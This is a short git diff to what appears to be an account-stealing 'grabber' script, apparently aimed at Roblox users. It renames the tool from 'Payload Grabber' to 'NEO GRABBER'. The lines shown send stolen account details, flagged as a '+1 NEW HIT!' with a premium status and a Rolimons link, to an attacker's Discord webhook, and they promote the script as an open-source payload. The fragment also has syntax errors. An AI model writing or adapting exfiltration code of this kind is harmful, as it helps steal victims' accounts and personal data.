@@ -122,11 +122,11 @@ premium = info['IsPremium']
 
 discord = Discord(url=webhookk)
 discord.post(
-    username="Payload Grabber"
+    username="NEO GRABBER"
     avatar_url="https://cdn.discordapp.com/attachments/991075594420748319/1043931056073621744/Main_Logo.png",
     embeds=[
         {
-            "username": "Payload Grabber"
+            "username": "NEO GRABBER"
             "title": "🔥+1 NEW HIT!🔥"
             "description" : f"[Source Code](https://github.com/TheGeekLucas/NEO-Grabber) | [Rolimons]({rolimons}) This is open source payload. You can edit it aswell.",
             "color" : 8819de,
